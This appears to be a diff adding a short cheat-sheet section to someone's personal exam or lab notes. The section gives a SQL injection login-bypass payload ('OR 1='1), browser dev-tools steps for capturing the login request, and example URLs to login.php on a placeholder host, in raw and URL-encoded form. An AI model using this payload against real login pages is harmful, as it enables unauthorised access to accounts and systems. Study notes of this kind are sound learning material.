@@ -14,3 +14,8 @@ calm down, read full question.
 
 NOTES:
 --------------------------------
+####AUTHENTICATION BYPASS#####
+'OR 1='1   $truth statement in username and password
+Go to inspect > network (login so you get the post) > post > request > raw (radio button) > paste ?THERAWSTRING into google
+x.x.x.x/login.php?username='OR 1='1&password=OR 1='1    ####put a ? after the php, and then paste the RAWSTRING directory after it.
+x.x.x.x/login.php?username=%27OR+1%3D%271&passwd=%27OR+1%3D%271   ###Example of what it should look like
